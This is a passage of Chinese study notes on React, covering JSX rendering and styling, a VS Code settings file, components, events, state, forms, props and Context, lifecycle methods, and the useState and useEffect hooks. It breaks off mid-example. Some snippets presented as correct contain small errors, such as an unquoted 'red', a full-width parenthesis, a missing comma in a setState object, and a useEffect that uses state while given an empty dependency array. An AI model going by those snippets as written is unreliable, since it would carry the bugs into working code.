#### 4.4 jsx条件渲染

作用：根据是否满足条件生成HTML结构，比如Loading效果

实现：可以使用 `三元运算符` 或  `逻辑与(&&)运算符`

```jsx
// 来个布尔值
const flag = true
function App() {
  return (
    <div className="App">
      {/* 条件渲染字符串 */}
      {flag ? 'react真有趣' : 'vue真有趣'}
      {/* 条件渲染标签/组件 */}
      {flag ? <span>this is span</span> : null}
    </div>
  )
}
export default App
```

#### 4.5 jsx样式处理

-   行内样式 - style 

```jsx
function App() {
  return (
    <div className="App">
      <div style={{ color: 'red' }}>this is a div</div>
    </div>
  )
}

export default App
```

-  行内样式 - style - 更优写法 

```jsx
const styleObj = {
    color:red
}

function App() {
  return (
    <div className="App">
      <div style={ styleObj }>this is a div</div>
    </div>
  )
}

export default App
```

-  类名 - className（推荐）

```CSS
.title{
  font-size: 30px;
  color: blue;
}
```

-  类名 - className - 动态类名控制 

```jsx
import './app.css'
const showTitle = true
function App() {
  return (
    <div className="App">
      <div className={ showTitle ? 'title' : ''}>this is a div</div>
    </div>
  )
}
export default App
```

#### 4.6 JSX注意事项

1. ==JSX必须有一个根节点==，如果没有根节点，可以使用`<></>`（幽灵节点）替代
2. 所有标签必须形成闭合，成对闭合或者自闭合都可以
3. JSX中的语法更加贴近JS语法，属性名采用驼峰命名法  `class -> className`  `for -> htmlFor`
4. JSX支持多行（换行），如果需要换行，需使用`()` 包裹，防止bug出现



### 5、格式化配置

1.  安装vsCode prettier插件 
2.  修改配置文件 `setting.json` 

```json
{
  "git.enableSmartCommit": true,
  // 修改注释颜色
  "editor.tokenColorCustomizations": {
    "comments": {
      "fontStyle": "bold",
      "foreground": "#82e0aa"
    }
  },
  // 配置文件类型识别
  "files.associations": {
    "*.js": "javascript",
    "*.json": "jsonc",
    "*.cjson": "jsonc",
    "*.wxss": "css",
    "*.wxs": "javascript"
  },
  "extensions.ignoreRecommendations": false,
  "files.exclude": {
    "**/.DS_Store": true,
    "**/.git": true,
    "**/.hg": true,
    "**/.svn": true,
    "**/CVS": true,
    "**/node_modules": false,
    "**/tmp": true
  },
  // "javascript.implicitProjectConfig.experimentalDecorators": true,
  "explorer.confirmDragAndDrop": false,
  "typescript.updateImportsOnFileMove.enabled": "prompt",
  "git.confirmSync": false,
  "editor.tabSize": 2,
  "editor.fontWeight": "500",
  "[json]": {},
  "editor.tabCompletion": "on",
  "vsicons.projectDetection.autoReload": true,
  "editor.fontFamily": "Monaco, 'Courier New', monospace, Meslo LG M for Powerline",
  "[html]": {
    "editor.defaultFormatter": "vscode.html-language-features"
  },
  "editor.fontSize": 16,
  "debug.console.fontSize": 14,
  "vsicons.dontShowNewVersionMessage": true,
  "editor.minimap.enabled": true,
  "emmet.extensionsPath": [
    ""
  ],
  // vue eslint start 保存时自动格式化代码
  "editor.formatOnSave": true,
  // eslint配置项，保存时自动修复错误
  "editor.codeActionsOnSave": {
    "source.fixAll": true
  },
  "vetur.ignoreProjectWarning": true,
  // 让vetur使用vs自带的js格式化工具
  // uni-app和vue 项目使用
  "vetur.format.defaultFormatter.js": "vscode-typescript",
  "javascript.format.semicolons": "remove",
  // // 指定 *.vue 文件的格式化工具为vetur
  "[vue]": {
    "editor.defaultFormatter": "octref.vetur"
  },
  // // 指定 *.js 文件的格式化工具为vscode自带
  "[javascript]": {
    "editor.defaultFormatter": "vscode.typescript-language-features"
  },
  // // 默认使用prettier格式化支持的文件
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "prettier.jsxBracketSameLine": true,
  // 函数前面加个空格
  "javascript.format.insertSpaceBeforeFunctionParenthesis": true,
  "prettier.singleQuote": true,
  "prettier.semi": false,
  // eslint end
  // react
  // 当按tab键的时候，会自动提示
  "emmet.triggerExpansionOnTab": true,
  "emmet.showAbbreviationSuggestions": true,
  "emmet.includeLanguages": {
    // jsx的提示
    "javascript": "javascriptreact",
    "vue-html": "html",
    "vue": "html",
    "wxml": "html"
  },
  // end
  "[jsonc]": {
    "editor.defaultFormatter": "vscode.json-language-features"
  },
  // @路径提示
  "path-intellisense.mappings": {
    "@": "${workspaceRoot}/src"
  },
  "security.workspace.trust.untrustedFiles": "open",
  "git.ignoreMissingGitWarning": true,
  "window.zoomLevel": 1
}
```

### 6、组件

#### 6.1 函数组件(没有状态)

负责静态

**概念**

使用 JS 的函数（或箭头函数）创建的组件，就叫做`函数组件`

```jsx
// 定义函数组件
function HelloFn () {
  return <div>这是我的第一个函数组件!</div>
}

// 定义类组件
function App () {
  return (
    <div className="App">
      {/* 渲染函数组件 */}
    <div>这是我的第一个函数组件!</div>
      <HelloFn></HelloFn>
    </div>
  )
}
export default App
```

**约定说明**

1. 组件的名称**必须首字母大写**，react内部会根据这个来判断是组件还是普通的HTML标签
2. 函数组件**必须有返回值**，表示该组件的 UI 结构；如果不需要渲染任何内容，则返回 null
3. 组件就像 HTML 标签一样可以被渲染到页面中。组件表示的是一段结构内容，对于函数组件来说，渲染的内容是函数的**返回值**就是对应的内容
4. 使用函数名称作为组件标签名称，可以成对出现也可以自闭合

#### 6.2 类组件(有状态)

提供交互

**组件定义与渲染**

```jsx
// 引入React
import React from 'react'

// 定义类组件
class HelloC extends React.Component {
  render () {
    return <div>这是我的第一个类组件!</div>
  }
}

function App () {
  return (
    <div className="App">
      {/* 渲染类组件 */}
      <HelloC />
      <HelloC></HelloC>
    </div>
  )
}
export default App
```

**约定说明**

1. **类名称也必须以大写字母开头**
2. 类组件应该继承 React.Component 父类，从而使用父类中提供的方法或属性
3. 类组件必须提供 render 方法**render 方法必须有返回值，表示该组件的 UI 结构**

#### 6.3 函数组件的事件绑定

##### 6.3.1 如何绑定事件

- 语法
  on + 事件名称 = { 事件处理程序 } ，比如：`<div onClick={ onClick }></div>` 
-  注意点
  react事件采用驼峰命名法，比如：onMouseEnter、onFocus 

```jsx
// 函数组件
function HelloFn () {
  // 定义事件回调函数
  const clickHandler = () => {
    console.log('事件被触发了')
  }
  return (
    // 绑定事件
    <button onClick={clickHandler}>click me!</button>
  )
}
```

##### 6.3.2 获取事件对象

 获取事件对象e只需要在 事件的回调函数中 补充一个形参e即可拿到

```jsx
// 函数组件
function HelloFn () {
  // 定义事件回调函数
  const clickHandler = (e) => {
    console.log('事件被触发了', e)
  }
  return (
    // 绑定事件
    <button onClick={clickHandler}>click me!</button>
  )
}
```

##### 6.3.3 传递额外参数

解决思路: 改造事件绑定为箭头函数 在箭头函数中完成参数的传递

```jsx	

import React from "react"

// 如何获取额外的参数？
// onClick={ onDel } -> onClick={ () => onDel(id) }
// 注意: 一定不要在模板中写出函数调用的代码 onClick = { onDel(id) }  bad!!!!!!

const TestComponent = () => {
  const list = [
    {
      id: 1001,
      name: 'react'
    },
    {
      id: 1002,
      name: 'vue'
    }
  ]
  const onDel = (e, id) => {
    console.log(e, id)
  }
  return (
      <ul>
        {list.map(item =>（
           <li key={item.id}>
                {item.name}
                <button onClick={(e) => onDel(e, item.id)}>x</button>
           </li>
        ))}
      </ul>
  )
}

function App () {
  return (
    <div>
      <TestComponent />
    </div>
  )
}


export default App
```

#### 6.4 类组件的事件绑定

类组件中的事件绑定，整体的方式和函数组件差别不大

唯一需要注意的 因为处于class类语境下 所以定义事件回调函数以及定它写法上有不同

1. 定义的时候: class Fields语法  

2. 使用的时候: 需要借助this关键词获取

```jsx

import React from "react"
class CComponent extends React.Component {
  // class Fields
  clickHandler = (e, num) => {
    // 这里的this指向的是正确的当前的组件实例对象 
    // 可以非常方便的通过this关键词拿到组件实例身上的其他属性或者方法
    console.log(this)
  }

  clickHandler1 () {
    // 这里的this 不指向当前的组件实例对象而指向undefined 存在this丢失问题
    console.log(this)
  }

  render () {
    return (
      <div>
        <button onClick={(e) => this.clickHandler(e, '123')}>click me</button>
        <button onClick={this.clickHandler1}>click me</button>
      </div>
    )
  }
}

function App () {
  return (
    <div>
      <CComponent />
    </div>
  )
}

export default App

```

#### 6.5 组件状态

一个前提：在React hook出来之前，函数式组件是没有自己的状态的，所以我们统一通过类组件来讲解

![image-20230713193439417](./img/小米虫爬山路-img/image-20230713193439417.png)

##### 6.5.1 初始化状态

-  通过class的实例属性state来初始化 

-  state的值是一个对象结构，表示一个组件可以有多个数据状态 

  ```jsx
  class Counter extends React.Component {
  // 初始化状态
  state = {
  count: 0
  }
  render() {
  return <button>计数器</button>
  }
  }
  ```

##### 6.5.2 读取状态

-  通过this.state来获取状态 

```jsx
class Counter extends React.Component {
  // 初始化状态
  state = {
    count: 0
  }
  render() {
    // 读取状态
    return <button>计数器{this.state.count}</button>
  }
}
```

##### 6.5.3 修改状态

-  语法
  `this.setState({ 要修改的部分数据 })` 
-  setState方法作用 

1. 1. 修改state中的数据状态
   2. 更新UI

-  思想
    	数据驱动视图，也就是只要修改数据状态，那么页面就会自动刷新，无需手动操作dom 
-  注意事项
    	**不要直接修改state中的值，必须通过setState方法进行修改** 

```jsx
class Counter extends React.Component {
  // 定义数据
  state = {
    count: 0
  }
  // 定义修改数据的方法
  setCount = () => {
    this.setState({
      count: this.state.count + 1
    })
  }
  // 使用数据 并绑定事件
  render () {
    return <button onClick={this.setCount}>{this.state.count}</button>
  }
}
```

总结

1．编写组件其实就是编写原生js类或者函数

2．定义状态必须通过state 实例属性的方法提供一个对象名称是固定的就叫做state

3．修改state中的任何属性都不可以通过直接赋值必须走setstate方法这个方法来自于继承得到

4．这里的this关键词很容易出现指向错误的问题上面的写法是最推荐和最规范的没有this指向问题

##### this问题说明

你必须谨慎对待JSX回调函数中的this，在JavaScript 中,class的方法默认不会绑定this。如果你忘记绑定this.handleclick 并把它传入了onClick，当你调用这个函数的时候this的值为undefined 。

这并不是React特有的行为;这其实与JavaScript函数工作原理有关。通常情况下，如果你没有在方法后面添加()，例如onClick={this.handleClick}，你应该为这个方法绑定this。

这里我们作为了解内容，随着js标准的发展，主流的写法已经变成了class fields，==无需考虑太多this问题==





==箭头函数的this和普通函数的this的区别==

在箭头函数中，`this` 的值是在==函数定义时==确定的，并且==继承自外部的词法作用域==。箭头函数不会创建自己的执行上下文，所以无法通过调用方式来改变 `this` 的指向。

而在普通函数中，`this` 的值是在==函数被调用时确定==的，取决于==函数的调用方式时的上下文==。当使用普通函数声明或函数表达式定义函数时，`this` 的值会动态地绑定到==调用该函数的对象上==。

```javascript
const obj = {
  name: 'Alice',
  arrowFunction: () => {
    console.log(this.name);
  },
  regularFunction: function() {
    console.log(this.name);
  }
};

obj.arrowFunction();  // 输出: undefined (箭头函数中的 this 继承自外部作用域，因此 this.name 是 undefined)
obj.regularFunction();  // 输出: Alice (普通函数中的 this 指向调用它的对象，即 obj，所以 this.name 是 'Alice')

```

在这个示例中，箭头函数 `arrowFunction` 是在对象 `obj` 中定义的。然而，由于箭头函数继承了====定义时的外部作用域==，它的作用域是全局作用域，而不是 `obj` 对象的作用域。

在箭头函数内部，使用 `this.name` 来访问 `name` 属性时，`this` 指向的是==定义箭头函数==的==外部作用域==，通常是全局作用域。由于全局作用域中没有定义 `name` 属性，所以输出结果为 `undefined`。

因此，在对象中使用箭头函数定义的方法，其作用域是定义箭头函数时的外部作用域，通常是全局作用域。它不会绑定到对象本身，并且无法访问对象的属性或方法。



##### React的状态不可变

**概念**：不要直接修改状态的值，而是基于当前状态创建新的状态值,简单理解就是React中不能直接赋值。

**错误的直接修改**

```javascript
state = {
  count : 0,
  list: [1,2,3],
  person: {
     name:'jack',
     age:18
  }
}
// 直接修改简单类型Number
this.state.count++
++this.state.count
this.state.count += 1
this.state.count = 1

// 直接修改数组
this.state.list.push(123)
this.state.list.spice(1,1)

// 直接修改对象
this.state.person.name = 'rose'
```

**基于当前状态创建新值**

```javascript
this.setState({
    count: this.state.count + 1
    list: [...this.state.list, 4],
    person: {
       ...this.state.person,
       // 覆盖原来的属性 就可以达到修改对象中属性的目的
       name: 'rose'
    }
})
```

### 7、表单处理

使用React处理表单元素，一般有俩种方式：

1. 受控组件 （推荐使用）
2. 非受控组件 （了解）

#### 7.1 受控表单组件

什么是受控组件？  `input框自己的状态被React组件状态控制`

React组件的状态的地方是在state中，input表单元素也有自己的==状态是在value中==，React将state与表单元素的值（value）绑定到一起，由state的值来控制表单元素的值，从而保证单一数据源特性

**实现步骤**

以获取文本框的值为例，受控组件的使用步骤如下：

1. 在组件的state中声明一个组件的状态数据
2. 将状态数据设置为input标签元素的value属性的值
3. 为input添加change事件，在事件处理程序中，通过事件对象e获取到当前文本框的值（`即用户当前输入的值`）
4. 调用setState方法，将文本框的值作为state状态的最新值

```jsx
import React from 'react'

class InputComponent extends React.Component {
  // 声明组件状态
  state = {
    message: 'this is message',
  }
  // 声明事件回调函数
  changeHandler = (e) => {
    this.setState({ message: e.target.value })
  }
  render () {
    return (
      <div>
        {/* 绑定value 绑定事件*/}
        <input value={this.state.message} onChange={this.changeHandler} />
      </div>
    )
  }
}


function App () {
  return (
    <div className="App">
      <InputComponent />
    </div>
  )
}
export default App
```

#### 7.2 非受控表单组件

什么是非受控组件？

非受控组件就是通过手动操作dom的方式获取文本框的值，文本框的状态不受react组件的state中的状态控制，直接通过原生dom获取输入框的值

**实现步骤**

1. 导入`createRef` 函数
2. 调用createRef函数，创建一个ref对象，存储到名为`msgRef`的实例属性中
3. 为input添加ref属性，值为`msgRef`
4. 在按钮的事件处理程序中，通过`msgRef.current`即可拿到input对应的dom元素，而其中`msgRef.current.value`拿到的就是文本框的值

```jsx
import React, { createRef } from 'react'

class InputComponent extends React.Component {
  // 使用createRef产生一个存放dom的对象容器
  msgRef = createRef()

  changeHandler = () => {
    console.log(this.msgRef.current.value)
  }

  render() {
    return (
      <div>
        {/* ref绑定 获取真实dom */}
        <input ref={this.msgRef} />
        <button onClick={this.changeHandler}>click</button>
      </div>
    )
  }
}

function App () {
  return (
    <div className="App">
      <InputComponent />
    </div>
  )
}
export default App
```

### 8、React组件通信

#### 8.1 组件通信的意义

组件是独立且封闭的单元，默认情况下组件**只能使用自己的数据（state）**

组件化开发的过程中，完整的功能会拆分多个组件，在这个过程中不可避免的需要互相传递一些数据

为了能让各组件之间可以进行互相沟通，数据传递，这个过程就是组件通信

1. 父子关系 -  **最重要的**
2. 兄弟关系 -  自定义事件模式产生技术方法 eventBus  /  通过共同的父组件通信
3. 其它关系 -  **mobx / redux / zustand**

#### 8.2 父传子实现

**实现步骤**

1.  父组件提供要传递的数据  -  `state` 
2.  给子组件标签`添加属性`值为 state中的数据 
3.  子组件中通过 `props` 接收父组件中传过来的数据 

1. 1. 类组件使用this.props获取props对象
   2. 函数式组件直接通过参数获取props对象



![img](./img/小米虫爬山路-img/1654490432739-ea283505-3ddd-4403-9fba-7735b04b451e.png)

```jsx
import React from 'react'

// 函数式子组件
function FSon(props) {
  console.log(props)
  return (
    <div>
      子组件1
      {props.msg}
    </div>
  )
}

// 类子组件
class CSon extends React.Component {
  render() {
    return (
      <div>
        子组件2
        {this.props.msg}
      </div>
    )
  }
}
// 父组件
class App extends React.Component {
  state = {
    message: 'this is message'
  }
  render() {
    return (
      <div>
        <div>父组件</div>
        <FSon msg={this.state.message} />
        <CSon msg={this.state.message} />
      </div>
    )
  }
}

export default App
```

#### 8.3 props说明

##### 8.3.1  **props是只读对象（readonly）**

根据单项数据流的要求，子组件只能读取props中的数据，不能进行修改

##### 8.3.2 **props可以传递任意数据**

数字、字符串、布尔值、数组、对象、`函数、JSX`

```jsx
class App extends React.Component {
  state = {
    message: 'this is message'
  }
  render() {
    return (
      <div>
        <div>父组件</div>
        <FSon 
          msg={this.state.message} 
          age={20} 
          isMan={true} 
          cb={() => { console.log(1) }} 
          child={<span>this is child</span>}
        />
        <CSon msg={this.state.message} />
      </div>
    )
  }
}
```

![image-20230714113157687](./img/小米虫爬山路-img/image-20230714113157687.png)

#### 8.4 子传父实现

**口诀：** 父组件给子组件传递回调函数，子组件调用

**实现步骤**

1. 父组件提供一个回调函数 - 用于接收数据
2. 将函数作为属性的值，传给子组件
3. 子组件通过props调用 回调函数
4. 将子组件中的数据作为参数传递给回调函数

![props-4.png](./img/小米虫爬山路-img/1654490502446-0596a169-847f-4446-91ce-a9a0237a9074.png)

```jsx
import React from 'react'

// 子组件
function Son(props) {
  function handleClick() {
    // 调用父组件传递过来的回调函数 并注入参数
    props.changeMsg('this is newMessage')
  }
  return (
    <div>
      {props.msg}
      <button onClick={handleClick}>change</button>
    </div>
  )
}


class App extends React.Component {
  state = {
    message: 'this is message'
  }
  // 提供回调函数
  changeMessage = (newMsg) => {
    console.log('子组件传过来的数据:',newMsg)
    this.setState({
      message: newMsg
    })
  }
  render() {
    return (
      <div>
        <div>父组件</div>
        <Son
          msg={this.state.message}
          // 传递给子组件
          changeMsg={this.changeMessage}
        />
      </div>
    )
  }
}

export default App
```

#### 8.5 兄弟组件通信

**核心思路：** 通过状态提升机制，利用共同的父组件实现兄弟通信



![img](./img/小米虫爬山路-img/1654490527043-7acbe144-a306-40af-a878-3a7f4ba3a599.png)**实现步骤**

1. 将共享状态提升到最近的公共父组件中，由公共父组件管理这个状态 

- - 提供共享状态
  - 提供操作共享状态的方法

1. 要接收数据状态的子组件通过 props 接收数据
2. 要传递数据状态的子组件通过props接收方法，调用方法传递数据

```jsx
import React from 'react'

// 子组件A
function SonA(props) {
  return (
    <div>
      SonA
      {props.msg}
    </div>
  )
}
// 子组件B
function SonB(props) {
  return (
    <div>
      SonB
      <button onClick={() => props.changeMsg('new message')}>changeMsg</button>
    </div>
  )
}

// 父组件
class App extends React.Component {
  // 父组件提供状态数据
  state = {
    message: 'this is message'
  }
  // 父组件提供修改数据的方法
  changeMsg = (newMsg) => {
    this.setState({
      message: newMsg
    })
  }

  render() {
    return (
      <> 
        {/* 接收数据的组件 */}
        <SonA msg={this.state.message} />
        {/* 修改数据的组件 */}
        <SonB changeMsg={this.changeMsg} />
      </>
    )
  }
}

export default App
```

#### 8.6 跨组件通信Context

![img](./img/小米虫爬山路-img/1654490557423-1b93cabb-8bb8-4d6d-91f5-77c5cbddf105.png)

上图是一个react形成的嵌套组件树，如果我们想从==App组件向任意一个下层组件传递数据==，该怎么办呢？目前我们能采取的方式就是一层一层的props往下传，显然很繁琐

那么，Context 提供了一个**无需为每层组件手动添加 props，就能在组件树间进行数据传递的方法**

==**实现步骤**==

1 创建Context对象 导出 Provider 和 Consumer对象 

```javascript
const { Provider, Consumer } = createContext()
```

2- 使用Provider包裹上层组件提供数据 

```jsx
<Provider value={this.state.message}>
    {/* 根组件 */}
</Provider>
```

3- 需要用到数据的组件使用Consumer包裹获取数据 

```jsx
<Consumer >
    {value => /* 基于 context 值进行渲染*/}
</Consumer>
```

```jsx
import React, { createContext }  from 'react'

// 1. 创建Context对象 
const { Provider, Consumer } = createContext()


// 3. 消费数据
function ComC() {
  return (
    <Consumer >
      {value => <div>{value}</div>}
    </Consumer>
  )
}

function ComA() {
  return (
    <ComC/>
  )
}

// 2. 提供数据
class App extends React.Component {
  state = {
    message: 'this is message'
  }
  render() {
    return (
      <Provider value={this.state.message}>
        <div className="app">
          <ComA />
        </div>
      </Provider>
    )
  }
}

export default App
```

### 9、React组件进阶

#### 9.1 children属性

**props中children属性是什么**

表示该组件的子节点，只要组件内部有子节点，props中就有该属性

**children可以是什么**

1. 普通文本
2. 普通标签元素
3. 函数 / 对象
4. JSX

#### 9.2 props校验-场景和使用

对于组件来说，props是由外部传入的，我们其实无法保证组件使用者传入了什么格式的数据，如果传入的数据格式不对，就有可能会导致组件内部错误，有一个点很关键 - **组件的使用者可能报错了也不知道为什么**，看下面的例子

![image-20230714172003549](./img/小米虫爬山路-img/image-20230714172003549.png)

面对这样的问题，如何解决？ **props校验**

**实现步骤**

1. 安装属性校验包：`npm add prop-types`
2. 导入`prop-types` 包
3. 使用 `组件名.propTypes = {}` 给组件添加校验规则

```jsx
import PropTypes from 'prop-types'

const List = props => {
  const arr = props.colors
  const lis = arr.map((item, index) => <li key={index}>{item.name}</li>)
  return <ul>{lis}</ul>
}

List.propTypes = {
  colors: PropTypes.array
}
```

#### 9.3 props校验-规则说明

**四种常见结构**

1. 常见类型：array、bool、func、number、object、string

2. React元素类型：element

3. 必填项：isRequired

4. 特定的结构对象：shape({})

   ```javascript
   // 常见类型
   optionalFunc: PropTypes.func,
   // 必填 只需要在类型后面串联一个isRequired
   requiredFunc: PropTypes.func.isRequired,
   // 特定结构的对象
   optionalObjectWithShape: PropTypes.shape({
   color: PropTypes.string,
   fontSize: PropTypes.number
   })
   ```

   

官网文档更多阅读：https://reactjs.org/docs/typechecking-with-proptypes.html

#### 9.4 props校验-默认值

通过 `defaultProps` 可以给组件的props设置默认值，在未传入props的时候生效

##### 9.4.1 函数组件

直接使用函数参数默认值

```jsx
function List({pageSize = 10}) {
  return (
    <div>
      此处展示props的默认值：{ pageSize }
    </div>
  )
}

// 不传入pageSize属性
<List />
```

##### 9.4.2 类组件

使用类静态属性声明默认值，`static defaultProps = {}`

```jsx
class List extends Component {
  static defaultProps = {
    pageSize: 10
  }
  render() {
    return (
      <div>
        此处展示props的默认值：{this.props.pageSize}
      </div>
    )
  }
}
<List />
```

#### 9.5  生命周期 - 概述

组件的生命周期是指组件从被创建到挂载到页面中运行起来，再到组件不用时卸载的过程，注意，只有类组件才有生命周期（类组件 实例化  函数组件 不需要实例化）

![img](./img/小米虫爬山路-img/1654490712545-6bd28fa7-290b-48fb-8d51-bbf5578dad3f.png)



http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/



#### 9.6 生命周期 - 挂载阶段

![image-20230716203930988](./img/小米虫爬山路-img/image-20230716203930988.png)

|     钩子 函数     |                      触发时机                       |                             作用                             |
| :---------------: | :-------------------------------------------------: | :----------------------------------------------------------: |
|    constructor    |    创建组件时，最先执行，初始化的时候只执行一次     | 1. 初始化state  2. 创建 Ref 3. 使用 bind 解决 this 指向问题等 |
|      render       |                每次组件渲染都会触发                 |        渲染UI（**注意： 不能在里面调用setState()** ）        |
| componentDidMount | 组件挂载（完成DOM渲染）后执行，初始化的时候执行一次 |                  1. 发送网络请求  2.DOM操作                  |



#### 9.7 生命周期 - 更新阶段

![image-20230716204200010](./img/小米虫爬山路-img/image-20230716204200010.png)

|      钩子函数      |         触发时机          |                             作用                             |
| :----------------: | :-----------------------: | :----------------------------------------------------------: |
|       render       |   每次组件渲染都会触发    |             渲染UI（与 挂载阶段 是同一个render）             |
| componentDidUpdate | 组件更新后（DOM渲染完毕） | DOM操作，可以获取到更新后的DOM内容，**不要直接调用setState** |



#### 9.8 生命周期 - 卸载阶段

|       钩子函数       |         触发时机         |                作用                |
| :------------------: | :----------------------: | :--------------------------------: |
| componentWillUnmount | 组件卸载（从页面中消失） | 执行清理工作（比如：清理定时器等） |

### 10、Hooks基础

#### 10.1 Hooks概念理解

##### 10.1.1 什么是hooks

==Hooks的本质：**一套能够使函数组件更强大，更灵活的“钩子”**==

React体系里组件分为 ==类组件== 和 ==函数组件==

经过多年的实战，函数组件是一个更加匹配React的设计理念 `UI = f(data)`，也更有利于逻辑拆分与重用的组件表达形式，==而先前的函数组件是不可以有自己的状态的，为了能让函数组件可以拥有自己的状态==，所以从react v16.8开始，Hooks应运而生

**注意点：**

1. 有了hooks之后，为了兼容老版本，class类组件并没有被移除，俩者都可以使用
2. 有了hooks之后，不能在把函数成为无状态组件了，因为hooks为函数组件提供了状态
3. ==hooks只能在函数组件中使用==

##### 10.1.2 Hooks解决了什么问题

Hooks的出现解决了俩个问题   1. 组件的状态逻辑复用  2.class组件自身的问题

1.  组件的逻辑复用
   在hooks出现之前，react先后尝试了 mixins混入，HOC高阶组件，render-props等模式
   但是都有各自的问题，比如mixin的数据来源不清晰，高阶组件的嵌套问题等等 
2.  class组件自身的问题
   class组件就像一个厚重的‘战舰’ 一样，大而全，提供了很多东西，有不可忽视的学习成本，比如各种生命周期，this指向问题等等，而我们更多时候需要的是一个轻快灵活的'快艇' 

#### 10.2 useState

##### 10.2.1 基础使用

**作用**

useState为函数组件提供状态（state）

**使用步骤**

1. 导入 `useState` 函数
2. 调用 `useState` 函数，并传入状态的初始值
3. 从`useState`函数的返回值中，拿到状态和修改状态的方法
4. 在JSX中展示状态
5. 调用修改状态的方法更新状态

```jsx
import { useState } from 'react'

function App() {
  // 参数：状态初始值比如,传入 0 表示该状态的初始值为 0
  // 返回值：数组,包含两个值：1 状态值（state） 2 修改该状态的函数（setState）
  const [count, setCount] = useState(0)
  return (
    <button onClick={() => { setCount(count + 1) }}>{count}</button>
  )
}
export default App
```

##### 10.2.2 状态的读取和修改

**读取状态**

该方式提供的状态，是函数内部的局部变量，可以在函数内的任意位置使用

**修改状态**

1. setCount是一个函数，参数表示`最新的状态值`
2. 调用该函数后，将使用新值替换旧值
3. 修改状态后，由于状态发生变化，会引起视图变化



**注意事项**

1. 修改状态的时候，一定要使用新的状态替换旧的状态，不能直接修改旧的状态，尤其是引用类型

##### 10.2.3 组件的更新过程

函数组件使用 **useState** hook 后的执行过程，以及状态值的变化



- 组件第一次渲染 

1. 1. 从头开始执行该组件中的代码逻辑
   2. 调用 `useState(0)` 将传入的参数作为状态初始值，即：0
   3. 渲染组件，此时，获取到的状态 count 值为： 0

- 组件第二次渲染 

1. 1. 点击按钮，调用 `setCount(count + 1)` 修改状态，因为状态发生改变，所以，该组件会重新渲染
   2. 组件重新渲染时，会再次执行该组件中的代码逻辑
   3. 再次调用 `useState(0)`，此时 **React 内部会拿到最新的状态值而非初始值**，比如，该案例中最新的状态值为 1
   4. 再次渲染组件，此时，获取到的状态 count 值为：1



注意：**useState 的初始值(参数)只会在组件第一次渲染时生效**。也就是说，以后的每次渲染，useState 获取到都是最新的状态值，React 组件会记住每次最新的状态值

```jsx
import { useState } from 'react'

function App() {
  const [count, setCount] = useState(0)
  // 在这里可以进行打印测试
  console.log(count)
  return (
    <button onClick={() => { setCount(count + 1) }}>{count}</button>
  )
}
export default App
```

##### 10.2.4 使用规则

1.  `useState` 函数可以执行多次，每次执行互相独立，每调用一次为函数组件提供一个状态 

```javascript
function List(){
  // 以字符串为初始值
  const [name, setName] = useState('cp')
  // 以数组为初始值
  const [list,setList] = useState([])
}
```

2. `useState` 注意事项 

1. 1.  只能出现在函数组件或者其他hook函数中 
   2.  不能嵌套在if/for/其它函数中（react按照hooks的调用顺序识别每一个hook） 

```javascript
let num = 1
function List(){
  num++
  if(num / 2 === 0){
     const [name, setName] = useState('cp') 
  }
  const [list,setList] = useState([])
}
// 俩个hook的顺序不是固定的，这是不可以的！！！
```

可以通过开发者工具查看hooks状态 

==注意：在 React 中，当一个函数组件的状态量发生变化时，React 会触发组件的重新渲染。在重新渲染过程中，React 会比较新旧状态的差异，并只更新受影响的部分。==

#### 10.3 useEffect

##### 10.3.1 理解函数副作用

**什么是副作用**

副作用是相对于主作用来说的，一个函数除了主作用，其他的作用就是副作用。对于 React 组件来说，**主作用就是根据数据（state/props）渲染 UI**，除此之外都是副作用（比如，手动修改 DOM）

**常见的副作用**

1. 数据请求 ajax发送
2. 手动修改dom
3. localstorage操作



useEffect函数的作用就是为react函数组件提供副作用处理的！



##### 10.3.2 基础使用

**作用**

为react函数组件提供副作用处理



**使用步骤**

1. 导入 `useEffect` 函数
2. 调用 `useEffect` 函数，并传入回调函数
3. 在回调函数中编写副作用处理（dom操作）
4. 修改数据状态
5. 检测副作用是否生效

```jsx
import { useEffect, useState } from 'react'

function App() {
  const [count, setCount] = useState(0)
 
  useEffect(()=>{
    // dom操作
    document.title = `当前已点击了${count}次`
  },[])
  return (
    <button onClick={() => { setCount(count + 1) }}>{count}</button>
  )
}

export default App
```



##### 10.3.3 依赖项控制执行时机

**不添加依赖项**

组件首次渲染执行一次，以及不管是哪个状态更改引起组件更新时都会重新执行

1. 组件初始渲染
2. 组件更新 （不管是哪个状态引起的更新）

```jsx
useEffect(()=>{
    console.log('副作用执行了')
})
```

**添加空数组**

组件只在首次渲染时执行一次

```jsx
useEffect(()=>{
	 console.log('副作用执行了')
},[])
```

**添加特定依赖项**

副作用函数在首次渲染时执行，在依赖项发生变化时重新执行

```jsx
function App() {  
    const [count, setCount] = useState(0)  
    const [name, setName] = useState('zs') 
    
    useEffect(() => {    
        console.log('副作用执行了')  
    }, [count])  
    
    return (    
        <>      
         <button onClick={() => { setCount(count + 1) }}>{count}</button>      
         <button onClick={() => { setName('cp') }}>{name}</button>    
        </>  
    )
}
```

**注意事项**

useEffect 回调函数中用到的数据（比如，count）就是依赖数据，就应该出现在依赖项数组中，如果不添加依赖项就会有bug出现



##### 10.3.4 清理副作用

如果想要清理副作用 可以在副作用函数中的末尾return一个新的函数，在新的函数中编写清理副作用的逻辑

注意执行时机为：

1. 组件卸载时自动执行
2. 组件更新时，下一个useEffect副作用函数执行之前自动执行

```jsx
import { useEffect, useState } from "react"


const App = () => {
  const [count, setCount] = useState(0)
  useEffect(() => {
    const timerId = setInterval(() => {
      setCount(count + 1)
    }, 1000)
    return () => {
      // 用来清理副作用的事情
      clearInterval(timerId)
    }
  }, [count])
  return (
    <div>
      {count}
    </div>
  )
}

export default App
```

### 11、Hooks进阶

#### 11.1 useState - 回调函数的参数

**使用场景**

参数只会在组件的初始渲染中起作用，后续渲染时会被忽略。如果初始 state 需要通过计算才能获得，则可以传入一个函数，在函数中计算并返回初始的 state，此函数只在初始渲染时被调用

```jsx
const [name, setName] = useState(()=>{   
  // 编写计算逻辑    return '计算之后的初始值'
})
```

**语法规则**

1. 回调函数return出去的值将作为 `name` 的初始值
2. 回调函数中的逻辑只会在组件初始化的时候执行一次



**语法选择**

1. 如果就是初始化一个普通的数据 直接使用 `useState(普通数据)` 即可

2. 如果要初始化的数据无法直接得到需要通过计算才能获取到，使用`useState(()=>{})`

   **来个需求**

```jsx
import { useState } from 'react'

function Counter(props) {
  const [count, setCount] = useState(() => {
    return props.count
  })
  return (
    <div>
